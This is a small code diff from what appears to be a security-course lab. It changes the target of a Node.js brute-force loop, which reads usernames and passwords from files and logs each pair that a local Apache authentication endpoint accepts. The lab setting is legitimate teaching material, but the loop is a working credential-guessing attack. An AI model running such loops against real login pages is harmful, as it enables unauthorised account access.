@@ -13,7 +13,7 @@ usersReader.on("line", user => {
         input: fs.createReadStream("passwords.txt")
     });
     passwordReader.on("line", password => {
-        sendREquest("http://127.0.0.1/securityModel3IL/scripts/bruteForceIIS/server-test/", user, password)
+        sendREquest("http://127.0.0.1/securityModel3IL/servers/simpleApacheAuthentification/", user, password)
             .then(() => console.log(`${user} => ${password}`))
             .catch(() => {});
     });
